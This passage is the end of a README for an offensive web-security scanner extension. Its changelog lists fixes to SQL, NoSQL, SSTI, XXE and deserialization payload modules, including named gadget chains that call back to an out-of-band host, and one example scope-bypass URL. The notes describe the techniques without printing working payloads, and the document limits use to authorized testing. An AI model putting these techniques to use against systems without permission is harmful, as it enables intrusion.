- **Fixed OmniStrikeScanCheck stale findings** &mdash; Dashboard integration uses snapshot diff to avoid re-reporting cleared findings. Deferred findings use own request/response instead of unrelated audit trigger.
- **Fixed TimingLock semaphore ownership** &mdash; Replaced `Semaphore` with `ReentrantLock` so only the owning thread can release, preventing cross-thread unlock corruption.
- **Fixed CommandInjectionScanner empty baseline** &mdash; Skips output-based detection when baseline body is empty instead of false-matching against blank response.
- **Fixed GraphQL NoSQL injection** &mdash; `buildQueryForArg()` now passes JSON objects/arrays raw (unquoted) so MongoDB operators like `$ne` are not turned into string literals.
- **Fixed GraphQL Content-Length** &mdash; Uses `getBytes(UTF_8).length` instead of `String.length()` for correct byte-level Content-Length on multi-byte characters.
- **Fixed GraphQL IDOR null check** &mdash; Changed `!body.contains("null")` to `!body.equals("null")` so responses containing null JSON fields are not incorrectly filtered.
- **Fixed XXE/PathTraversal localhost false positive** &mdash; Evidence pattern for Windows hosts file changed from `"localhost"` (matches any page) to `"127.0.0.1\s+localhost"`.
- **Fixed SQLi Oracle DBMS_PIPE false condition** &mdash; Added fallback for direct DBMS_PIPE payloads without `WHEN 1=1`, replacing delay 18→0 for proper 3-step verification.
- **Fixed ScopeManager userinfo bypass** &mdash; Strips `user:pass@` from URLs before host extraction to prevent scope bypass via `http://attacker@target.com/`.
- **Fixed CollaboratorManager thread leak** &mdash; Shuts down existing poller before creating new one on re-initialization.
- **Fixed AI batch scan context loss** &mdash; Multi-pass analysis now accumulates summaries across passes instead of replacing, so later passes retain full context.
- **Fixed LlmClient JSON extraction** &mdash; Replaced naive first-`{`-to-last-`}` with proper brace-depth matching to avoid spanning multiple JSON objects.
- **Fixed SSTI engine filtering** &mdash; Thymeleaf detection now also fires Spring EL OOB payloads (and vice versa) since the two engines are closely related.
- **Fixed HPP false privilege escalation** &mdash; Removed `"session"` from Set-Cookie check — any session cookie being set was falsely flagged as privilege escalation.
- **Fixed context menu showing disabled modules** &mdash; Per-module submenu now uses `getEnabledNonAiModules()` instead of `getAllModules()`.
- **Fixed ClientSideAnalyzer IP skip** &mdash; Narrowed blanket `10.0.0.0/24` skip to only `10.0.0.0` and `10.0.0.1` to avoid suppressing real internal IP disclosures.
- **Fixed SecurityHeaderAnalyzer CSP scoping** &mdash; `data:`/`blob:` check now scoped to `script-src` directive only, not the entire CSP string.
- **Fixed SecurityHeaderAnalyzer duplicate headers** &mdash; Multiple instances of the same header are merged instead of overwritten.
- **Fixed CachePoisonScanner no-store/private** &mdash; `no-store` and `private` Cache-Control directives now correctly mark response as non-cacheable.
- **Fixed SmartSqliDetector race condition** &mdash; Uses atomic `putIfAbsent()` to prevent duplicate scans of the same parameter.
- **Fixed AiVulnAnalyzer cookie injection** &mdash; Uses `replaceCookieValue()` to preserve other cookies instead of replacing the entire Cookie header.
- **Fixed ActiveScanExecutor cancel count** &mdash; `cancelAll()` uses `shutdownNow()` return count instead of double-counting.
- **Fixed ModuleRegistry thread safety** &mdash; Uses `Collections.synchronizedMap()` with synchronized iteration.
- **Fixed CliBackend RCE** &mdash; User prompt now piped via stdin instead of interpolated into shell command arguments.
- **Fixed CollaboratorManager fuzzy matching** &mdash; Replaced substring search with exact `get()` by payload ID.
- **Fixed ClientSideAnalyzer secret detection** &mdash; `break` → `continue` in hardcoded secret checks so comment/placeholder/entropy filters apply to each match instead of aborting the entire scan.

### Previous (v1.26)

- **Deserialization OOB Payload Audit** &mdash; Triple-checked every OOB payload across all 6 languages. Removed ~21 non-functional payloads that could never trigger Collaborator callbacks (false negatives), fixed ~10 payloads with broken syntax/encoding. Net result: fewer wasted Collaborator interactions, zero false OOB positives.
- **Fixed .NET XML OOB** &mdash; All 5 .NET XML payloads were sending the payload name instead of the actual XML due to an array index swap. Now correctly sends XAML/XXE/XSLT payloads.
- **Fixed PHP Serialization** &mdash; PHP OOB payloads now use real null bytes for protected/private properties (was using literal `\0`). Fixed string length prefixes (Monolog `connectionString` s:14→s:19, SoapClient `_user_agent` s:13→s:11). Removed 5 non-functional PHP chains (GuzzleHttp Uri, Laravel PendingBroadcast, Symfony Process, SwiftMailer, SplFileObject).
- **Fixed Java OOB** &mdash; Removed Fastjson BasicDataSource (broken JNDI chain), Jackson/SnakeYAML SpringPropertyPathFactory (bean lookup, not JNDI), XStream ImageIO (no Collaborator URL). Fixed Fastjson LdapAttribute malformed JSON. Fixed doubled description prefixes ("Fastjson Fastjson JdbcRowSetImpl").
- **Fixed Python OOB** &mdash; Replaced `subprocess.check_output` (fails with plain string on Linux) with `os.popen` (always uses shell).
- **Fixed Ruby OOB** &mdash; Removed all 8 non-functional YAML payloads and 2 ERB Marshal payloads. Replaced with working Gem::Source payload.
- **Fixed .NET SoapFormatter** &mdash; Corrected non-existent `ServerWebRequest` type to `HttpWebRequest`. Fixed ObjectDataProvider namespace from XAML presentation to CLR assembly format.

### Previous (v1.25)

- **Deserialization OOB-First Architecture** &mdash; Deserialization scanner now fires all Collaborator OOB payloads before any other detection phase (time-based, error-based). If OOB confirms, remaining phases are skipped.
- **~77 Deserialization OOB Payloads** &mdash; Expanded OOB coverage across all 6 languages.
- **Fixed Java/PHP OOB** &mdash; Java sub-framework payloads now properly route through Collaborator. PHP OOB replaced broken payloads with real gadget chains.

### Previous (v1.24)

- **Evidence-Based Exploit Confidence** &mdash; AI exploitation results are FIRM only with concrete evidence. No evidence = not reported.
- **Fuzz History** &mdash; AI remembers every payload tested per URL/param/vuln type. Re-scan generates only novel payloads.
- **Manual-Only AI Scanning** &mdash; AI fires exclusively via right-click context menu.

---

## Security Notice

OmniStrike is designed for **authorized penetration testing** and **security research** only. Active scanners send additional HTTP requests to target applications. Use exclusively against systems you have explicit written permission to test.

---

## License

MIT License. See [LICENSE](LICENSE).

---

<p align="center">
  <strong>One JAR. 19 modules. Zero configuration.</strong><br>
  <sub>Stop managing extensions. Start finding vulnerabilities.</sub>
</p>
